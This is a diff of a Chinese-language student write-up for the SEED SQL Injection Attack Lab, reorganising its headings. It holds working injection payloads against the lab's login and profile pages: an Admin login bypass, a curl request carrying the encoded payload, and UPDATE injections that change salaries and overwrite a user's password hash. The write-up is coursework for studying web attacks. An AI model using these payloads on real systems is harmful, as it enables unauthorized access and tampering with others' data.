@@ -1,5 +1,7 @@
 # SQL Injection Attack Lab
 
+## Pre-Experiment
+
 这一期的主题是 SQL 注入攻击. 
 
 [地址](https://seedsecuritylabs.org/Labs_16.04/Web/Web_SQL_Injection/)
@@ -9,11 +11,7 @@
 [参考资料](https://blog.csdn.net/qq_37672864/article/details/89331585)
 
 
-## 预备知识
-
 - SQL 基础
-
-## 实验环境
 
 虚拟机中 `/var/www/SQLInjection/` 给出了一个 web 项目, 本地浏览器访问 `http://www.SEEDLabSQLInjection.com`. 
 
@@ -25,9 +23,7 @@ show tables;
 select * from credential;
 ```
 
-## 实验任务
-
-### T2 SQL Injection Attack on SELECT Statement
+## T2 SQL Injection Attack on SELECT Statement
 
 在登录页 (对应 `/var/www/SQLInjection/unsafe home.php`) 插入 SQL 片段来完成任务. 下面是 `unsafe home.php` 中相关的代码片段. 
 
@@ -37,7 +33,7 @@ $sql = "SELECT id, name, eid, salary, birth, ssn, address, email, nickname, Pass
         WHERE name= '$input_uname' and Password='$hashed_pwd'";
 ```
 
-#### T2.1 SQL Injection Attack from webpage
+### T2.1 SQL Injection Attack from webpage
 
 我们需要在登录页面的输入框中插入 SQL, 以 Admin 的身份登录. 
 
@@ -57,14 +53,14 @@ Admin' and Password = (select Password from credential where name='Admin') #
 最后的 `#` 会注释掉多余的 SQL. 
 :::
 
-#### T2.2 SQL Injection Attack from command line
+### T2.2 SQL Injection Attack from command line
 这个本质和 2.1 一样, 但是它要求仿造请求完成插入, 这里使用系统携带的 curl 工具. 
 ``` bash
 curl 'www.SeedLabSQLInjection.com//unsafe_home.php?username=Admin%27%20and%20Password%20%3D%20%28select%20Password%20from%20credential%20where%20name%3D%27Admin%27%29%20%23&Password=111'
 ```
 在请求中出现的特殊字符需要转成 ASCII 的 16 进制编码, 另外 `www.SeedLabSQLInjection.com` 后面的 `/` 貌似需要转义. 
 
-#### T2.3 Append a new SQL statement
+### T2.3 Append a new SQL statement
 
 这里要求在 2.1 和 2.2 的基础上尝试一次注入两句 SQL, 
 ``` sql {2}
@@ -75,7 +71,7 @@ insert into credential(name) values('test') #
 
 这个实验没有成功. 
 
-### T3 SQL Injection Attack on UPDATE Statement
+## T3 SQL Injection Attack on UPDATE Statement
 
 有 T2 的基础之后, T3 要简单的多, 主要是体验一下对数据库的修改, 相对读取数
 据, 这种 SQL 注入危害更大.
@@ -87,7 +83,7 @@ $sql = "UPDATE credential SET nickname='$input_nickname',email='$input_email', a
 $conn->query($sql);
 ```
 
-#### T3.1 Modify your own salary
+### T3.1 Modify your own salary
 
 修改自己的薪水, 在 phone number 输入框中输入, 
 
@@ -96,13 +92,13 @@ $conn->query($sql);
 ```
 不过这里要假装知道薪水对应的字段是 Salary. 
 
-#### T3.2 Modify other people’ salary
+### T3.2 Modify other people’ salary
 修改自己老板 Boby 的薪水, 在 phone number 中添加,
 ``` sql
 ', Salary='1000' where Name='Boby' #
 ```
 
-#### T3.3 Modify other people’ password
+### T3.3 Modify other people’ password
 修改老板 Boby 的密码, 进一步打击报复, 在 address 中添加
 ``` sql
 ', Password='7c4a8d09ca3762af61e59520943dc26494f8941b', PhoneNumber = '' where Name='Boby' #
